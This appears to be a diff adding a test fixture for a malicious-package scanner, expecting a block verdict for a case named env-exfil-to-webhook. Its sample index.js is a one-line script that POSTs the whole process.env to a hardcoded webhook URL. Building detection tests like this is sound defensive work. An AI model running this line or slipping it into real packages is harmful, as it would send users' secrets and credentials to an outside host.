@@ -1,0 +1,12 @@
+{
+  "name": "env-exfil-to-webhook",
+  "expect": "block",
+  "expectFinding": "network-exfil-or-loader",
+  "note": "process.env serialized and POSTed to a hardcoded webhook endpoint",
+  "evidence": {
+    "packageName": "helper-utils",
+    "sourceFiles": {
+      "index.js": "const https=require('https');fetch('https://webhook.site/1a2b3c',{method:'POST',body:JSON.stringify(process.env)});"
+    }
+  }
+}
